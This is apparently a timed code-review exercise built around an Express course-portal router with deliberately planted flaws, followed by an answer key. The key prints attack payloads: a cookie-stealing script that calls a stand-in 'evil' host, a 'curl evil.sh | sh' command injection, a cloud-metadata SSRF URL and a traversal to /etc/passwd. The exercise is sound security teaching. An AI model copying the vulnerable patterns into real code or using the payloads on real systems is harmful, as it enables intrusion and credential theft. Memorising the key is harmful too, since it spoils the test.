## Course Portal Router — Web security grab-bag (timed ~12 min)
Review this as if it's a PR. Talk through your passes, severity-tag findings, *then* read the key.

```ts
// routes/portal.ts
// Student-facing course-portal routes for the ed-tech platform.
// Mounted at /portal in app.ts, behind the global cookie-session middleware.
// Every handler except /search and /catalog requires a logged-in student.
import { Router, Request, Response } from 'express';
import { exec } from 'child_process';
import * as path from 'path';
import * as fs from 'fs';
import fetch from 'node-fetch';
import { db } from '../db';
import { escapeHtml } from '../util/html';
import { requireSession } from '../middleware/auth'; // populates req.session from a signed cookie

const router = Router();
const MATERIALS_DIR = '/srv/edu/materials';
const ALLOWED_FORMATS = ['pdf', 'epub', 'html'] as const;
type Format = (typeof ALLOWED_FORMATS)[number];

// GET /me — current student profile (JSON).
router.get('/me', requireSession, async (req: Request, res: Response) => {
  const user = await db.getUser(req.session.userId);
  res.json({ id: user.id, name: user.name, email: user.email });
});

// GET /catalog/:courseId — public course detail (JSON, no auth required).
router.get('/catalog/:courseId', async (req: Request, res: Response) => {
  const course = await db.getCourse(req.params.courseId);
  if (!course) return res.status(404).json({ error: 'no such course' });
  res.json(course);
});

// GET /search?q=...&format=pdf — catalog search with an inline results banner.
router.get('/search', (req: Request, res: Response) => {
  const q = String(req.query.q ?? '');
  const format = String(req.query.format ?? 'html');
  if (!ALLOWED_FORMATS.includes(format as Format)) {
    return res.status(400).json({ error: 'unsupported format' });
  }
  const rows = db.searchCourses(q, format as Format);
  res.set('Content-Type', 'text/html');
  res.send(`
    <section class="results">
      <h2>Results for "${q}"</h2>
      <ul>${rows.map((r) => `<li>${escapeHtml(r.title)}</li>`).join('')}</ul>
    </section>`);
});

// GET /materials/:courseId?name=syllabus.pdf — stream a course file to the student.
router.get('/materials/:courseId', requireSession, (req: Request, res: Response) => {
  const name = String(req.query.name ?? 'syllabus.pdf');
  const filePath = path.join(MATERIALS_DIR, req.params.courseId, name);
  fs.readFile(filePath, (err, data) => {
    if (err) return res.status(404).send('Not found');
    res.send(data);
  });
});

// POST /syllabus/import { url } — pull a syllabus from an instructor's external LMS.
router.post('/syllabus/import', requireSession, async (req: Request, res: Response) => {
  const { url } = req.body as { url: string };
  const upstream = await fetch(url);
  const text = await upstream.text();
  const saved = await db.saveSyllabus(req.session.userId, text);
  res.json({ id: saved.id, bytes: text.length });
});

// POST /certificate { studentName } — render a completion-certificate PDF via wkhtmltopdf.
router.post('/certificate', requireSession, (req: Request, res: Response) => {
  const name = req.body.studentName as string;
  const out = `/tmp/cert-${req.session.userId}.pdf`;
  exec(`wkhtmltopdf --title "${name}" /srv/edu/cert.html ${out}`, (err) => {
    if (err) return res.status(500).send(`cert failed: ${err.message}`);
    res.download(out);
  });
});

// POST /enroll/:courseId — enroll the current student in a course.
router.post('/enroll/:courseId', requireSession, async (req: Request, res: Response) => {
  await db.addEnrollment(req.session.userId, req.params.courseId);
  res.json({ enrolled: req.params.courseId });
});

// POST /enroll/:courseId/drop — student drops a course they're enrolled in.
router.post('/enroll/:courseId/drop', requireSession, async (req: Request, res: Response) => {
  await db.dropEnrollment(req.session.userId, req.params.courseId);
  res.json({ dropped: req.params.courseId });
});

// GET /enroll/callback?next=... — bounce back to wherever the enroll flow started.
router.get('/enroll/callback', requireSession, (req: Request, res: Response) => {
  const next = String(req.query.next ?? '/dashboard');
  res.redirect(next);
});

export default router;
```

<details>
<summary><b>Answer key — don't peek until you've reviewed</b></summary>

1. **Blocker (Reflected XSS):** `/search` interpolates the raw `q` query param (read line 34) straight into an HTML body at line 43, with `Content-Type: text/html` set on line 40 — `?q=<script>document.location='//evil/'+document.cookie</script>` executes in the victim's session. It slips past because the very next line (44) wraps `r.title` in `escapeHtml(...)`, so a skimming reviewer pattern-matches "they're escaping" and never notices the `${q}` two lines up is unescaped. **Fix:** `escapeHtml(q)`, or render through a template engine with contextual auto-escaping instead of hand-building HTML.

2. **Blocker (OS command injection):** `/certificate` builds a shell string by interpolating `req.body.studentName` into `exec(...)` (lines 69 and 71). A name like `"; curl evil.sh | sh; #`, or `$(reboot)` / backticks (which execute *even inside* the double quotes), runs arbitrary commands as the app user. It slips past because `exec` "looks like" it's just invoking a trusted, fixed binary. **Fix:** use `execFile('wkhtmltopdf', ['--title', name, '/srv/edu/cert.html', out])` so arguments go through an argv array and are never parsed by a shell.

3. **Blocker (SSRF):** `/syllabus/import` fetches a fully user-controlled `url` (lines 60–61) with no scheme or host allow-list, then even saves the response body (line 63). An attacker posts `http://169.254.169.254/latest/meta-data/iam/...` or `http://localhost:6379/` to read cloud-metadata credentials or hit internal services. It slips past because "import from a URL" is a legitimate-sounding feature with no obviously dangerous-looking sink. **Fix:** allow-list the scheme (`https` only), resolve the host and reject loopback / link-local / RFC-1918 ranges (ideally behind an egress proxy), and refuse redirects to internal addresses.

4. **Should-fix (Path traversal):** `/materials/:courseId` joins the `name` query param into a filesystem path (lines 50–51) and streams whatever it resolves to. `?name=../../../../etc/passwd` escapes `MATERIALS_DIR` and returns arbitrary files. It slips past because `path.join` reads as the "safe, idiomatic" way to build paths — but it cheerfully normalizes `../` segments out of the base dir. **Fix:** resolve and confine — `const full = path.resolve(MATERIALS_DIR, req.params.courseId, name); if (!full.startsWith(MATERIALS_DIR + path.sep)) return res.sendStatus(400);` — or map an opaque file ID to a known path.

5. **Should-fix (CSRF):** the state-changing POSTs — `/syllabus/import`, `/certificate`, `/enroll/:courseId`, `/enroll/:courseId/drop` (lines 59, 68, 78, 84) — are authenticated purely by the cookie session (see the header comment, line 3) with no anti-CSRF token and no mention of `SameSite`. A third-party page can auto-submit a form that silently drops a victim's enrollments. It slips past review because every handler visibly "has auth" (`requireSession`), and CSRF is an *absence* of a control, not a bad-looking line. **Fix:** require a CSRF token (synchronizer or double-submit) on all cookie-authenticated mutations and set the session cookie `SameSite=Lax`/`Strict`.

6. **Should-fix (Open redirect):** `/enroll/callback` redirects to an unvalidated `next` param (lines 91–92). `?next=https://evil.example/login` ships the authenticated student to an attacker-controlled page — clean phishing / OAuth-return abuse. It slips past because the `/dashboard` default makes it read like an internal-only bounce. **Fix:** accept relative paths only (reject values containing `://` or beginning with `//`), or resolve `next` against an allow-list of known in-app routes.

7. **Nit (Information disclosure):** the `/certificate` failure path returns the raw subprocess `err.message` to the client (line 72), leaking absolute paths, tool versions, and command fragments that help an attacker map the host. **Fix:** log the detail server-side and return a generic `500` body — the flat `'Not found'` in `/materials` (line 53) is the right shape to copy.

8. **Praise (Output encoding / input validation):** the `/search` handler actually does two things right — it escapes DB-sourced titles with `escapeHtml(r.title)` (line 44) and allow-lists `format` against `ALLOWED_FORMATS` *before* using it (lines 36–38, rejecting anything else with a 400). That's exactly the discipline missing two lines above on `q`, so frame the XSS fix as "apply the encoding you already trust here to the reflected input," not "bolt on something new."

**Senior framing to say out loud:** "My first pass is the trust boundary — every `req.query` / `req.body` / `req.params` value is attacker-controlled until proven otherwise, and here four of them flow straight into dangerous sinks: HTML (XSS), a shell (RCE), an outbound fetch (SSRF), and the filesystem (traversal), so those are my blockers and this PR doesn't ship until they're closed. Second pass is the cookie-auth surface: state-changing POSTs with no CSRF token plus an unvalidated redirect are should-fix CSRF/open-redirect. The error-message leak is a quick nit, and the existing escaping and format allow-listing in `/search` are the in-repo pattern I'd point everyone else at."
</details>
